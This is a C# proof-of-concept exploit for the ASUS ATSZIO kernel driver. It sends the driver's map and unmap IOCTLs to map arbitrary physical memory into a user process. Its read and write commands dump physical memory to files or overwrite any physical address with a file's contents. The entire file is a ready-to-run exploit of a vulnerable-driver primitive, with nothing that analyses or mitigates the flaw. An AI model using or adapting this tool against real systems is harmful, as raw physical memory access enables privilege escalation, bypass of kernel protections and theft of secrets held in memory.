using System;
using System.ComponentModel;
using System.Globalization;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

public class AtszIO : IDisposable
{

    public const uint IOCTL_MAPMEM = 0x8807200C;
    public const uint IOCTL_UNMAPMEM = 0x88072010;

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern SafeFileHandle CreateFile(
       string lpFileName,
       [MarshalAs(UnmanagedType.U4)] FileAccess dwDesiredAccess,
       [MarshalAs(UnmanagedType.U4)] FileShare dwShareMode,
       IntPtr lpSecurityAttributes,
       [MarshalAs(UnmanagedType.U4)] FileMode dwCreationDisposition,
       [MarshalAs(UnmanagedType.U4)] FileAttributes dwFlagsAndAttributes,
       IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeviceIoControl(
        SafeFileHandle hDevice,
        uint IoControlCode,
        ref MapMemIoctl InBuffer,
        int nInBufferSize,
        ref MapMemIoctl OutBuffer,
        int nOutBufferSize,
        IntPtr pBytesReturned,
        IntPtr Overlapped
    );

    [StructLayout(LayoutKind.Sequential)]
    public unsafe struct MapMemIoctl
    {
#if X64
        public ulong CountOfBytes;
        public long* Handle;
        public ulong MapLength;
        public ulong PhysicalAddress;
        public byte* VirtualAddress;
#elif X84
        public uint CountOfBytes;
        public int* Handle;
        public uint Length;
        public ulong PhysicalAddress;
        public byte* VirtualAddress;
#endif

        public MapMemIoctl(SafeFileHandle atszio, ulong PhysicalAddress, uint Length)
        {
            this.CountOfBytes = 0;
            this.Handle = null;
            this.MapLength = Length;
            this.PhysicalAddress = PhysicalAddress;
            this.VirtualAddress = null;

            // Fire the ioctl
            Console.WriteLine("[*] Mapping 0x{0}-0x{1} into this process' address space...", PhysicalAddress.ToString("X"), (PhysicalAddress + Length).ToString("X"));
            // Console.ReadLine();
            if (!DeviceIoControl(atszio, IOCTL_MAPMEM, ref this, Marshal.SizeOf(typeof(MapMemIoctl)), ref this, Marshal.SizeOf(typeof(MapMemIoctl)), IntPtr.Zero, IntPtr.Zero))
            {
                throw new Win32Exception();
            }
            Console.WriteLine("[+] Mapped at 0x{0}", new IntPtr(this.VirtualAddress).ToInt64().ToString("X"));
        }
    }

    private MapMemIoctl mm;
    private SafeFileHandle atszio = null;
    private bool ShouldDisposeOfAtszIO = false;
    private bool HasBeenDisposed = false;

    public uint Length
    {
        get
        {
            if (this.HasBeenDisposed) throw new ObjectDisposedException("ATSZIO");
            return (uint)mm.MapLength;
        }
    }

    public UnmanagedMemoryStream PhysicalMemoryBlock
    {
        get
        {
            // Console.ReadLine();
            if (this.HasBeenDisposed) throw new ObjectDisposedException("ATSZIO");
            unsafe
            {
                return new UnmanagedMemoryStream(mm.VirtualAddress, this.Length, this.Length, FileAccess.ReadWrite);
            }
        }
    }

    public AtszIO(ulong PhysicalAddress, uint Length) : this(null, PhysicalAddress, Length)
    {
    }

    public AtszIO(SafeFileHandle atszio, ulong PhysicalAddress, uint Length)
    {
        if (atszio == null)
        {
            atszio = CreateFile("\\\\.\\ATSZIO", FileAccess.ReadWrite, FileShare.None,
                IntPtr.Zero, FileMode.Create, FileAttributes.Temporary, IntPtr.Zero);
            this.ShouldDisposeOfAtszIO = true;
        }
        this.atszio = atszio;
        this.mm = new MapMemIoctl(atszio, PhysicalAddress, Length);
    }

    public void Dispose()
    {
        if (this.HasBeenDisposed) return;
        unsafe
        {
            Console.WriteLine("[*] Unmapping 0x{0}-0x{1} (0x{2})...",
                mm.PhysicalAddress.ToString("X"),
                (mm.PhysicalAddress + Length).ToString("X"),
                new IntPtr(mm.VirtualAddress).ToInt64().ToString("X")
            );
        }
        try
        {
            // Console.ReadLine();
            if (!DeviceIoControl(atszio, IOCTL_UNMAPMEM, ref mm, Marshal.SizeOf(typeof(MapMemIoctl)), ref mm, Marshal.SizeOf(typeof(MapMemIoctl)), IntPtr.Zero, IntPtr.Zero))
            {
                throw new Win32Exception();
            }
            Console.WriteLine("[+] Unmapped successfully");
        }
        finally
        {
            // dispose of the driver handle if needed
            if (this.ShouldDisposeOfAtszIO) atszio.Dispose();
            this.HasBeenDisposed = true;
        }
    }

    ~AtszIO()
    {
        this.Dispose();
    }
}

class atsz
{
    public static bool TryParseDecAndHex(string value, out ulong result)
    {
        if ((value.Length > 2) && (value.Substring(0, 2) == "0x")) return ulong.TryParse(value.Substring(2), NumberStyles.AllowHexSpecifier, CultureInfo.InvariantCulture, out result);
        return ulong.TryParse(value, out result);
    }

    public static void Usage()
    {
        Console.WriteLine("[*] Usage: {0} <read/write> <address> <length/file>", Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location));
        Console.WriteLine("[*] address: starting physical address to read/write, can be decimal or hex, for hex, start with 0x");
        Console.WriteLine("[*] length: size of memory to read, can be decimal or hex, for hex, start with 0x");
        Console.WriteLine("[*] file: file whose contents will be written at <address>");
    }

    public static void Read(ulong PhysicalAddress, ulong Length)
    {
        uint IterationSize = (IntPtr.Size == 8 ? (uint)0x10000000 : (uint)0x1000000);
        using (SafeFileHandle atszio = AtszIO.CreateFile("\\\\.\\ATSZIO", FileAccess.ReadWrite,
                FileShare.None, IntPtr.Zero, FileMode.Create, FileAttributes.Temporary, IntPtr.Zero))
        using (FileStream stream = new FileStream("" + (PhysicalAddress.ToString("X")) + "-" + ((PhysicalAddress + Length).ToString("X")) + ".bin", FileMode.Create))
        {
            for (; Length > 0; Length -= IterationSize, PhysicalAddress += IterationSize)
            {
                using (AtszIO mapper = new AtszIO(atszio, PhysicalAddress, (Length > IterationSize ? IterationSize : (uint)(Length & 0xffffffff))))
                {
                    Console.WriteLine("[+] Reading block of memory...");
                    mapper.PhysicalMemoryBlock.CopyTo(stream);
                }
                if (Length <= IterationSize) break;
            }
        }
        Console.WriteLine("[+] Read successful: " + (PhysicalAddress.ToString("X")) + "-" + ((PhysicalAddress + Length).ToString("X")) + ".bin");
    }

    public static void Write(ulong PhysicalAddress, string Filename)
    {
        using (FileStream stream = new FileStream(Filename, FileMode.Open))
        using (AtszIO mapper = new AtszIO(PhysicalAddress, (uint)stream.Length))
        {
            Console.WriteLine("[+] Writing block of memory...");
            stream.CopyTo(mapper.PhysicalMemoryBlock);
        }
    }

    public static void Main(string[] args)
    {
        Console.WriteLine("[*] ASUS ATSZIO (ATSZIO/ATSZIO64): PoC for Physical Memory Read/Write function");
        Console.WriteLine("[*] PoC by himeix - https://github.com/LimiQS");
        if (args.Length < 3)
        {
            Usage();
            return;
        }
        ulong PhysicalAddress, Length;
        switch (args[0])
        {
            case "read":
            case "-read":
            case "--read":
                if ((!TryParseDecAndHex(args[1], out PhysicalAddress)) || (!TryParseDecAndHex(args[2], out Length)))
                {
                    Usage();
                    return;
                }
                Read(PhysicalAddress, Length);
                break;
            case "write":
            case "-write":
            case "--write":
                if (!TryParseDecAndHex(args[1], out PhysicalAddress))
                {
                    Usage();
                    return;
                }
                Write(PhysicalAddress, args[2]);
                break;
            default:
                Usage();
                break;
        }
    }
}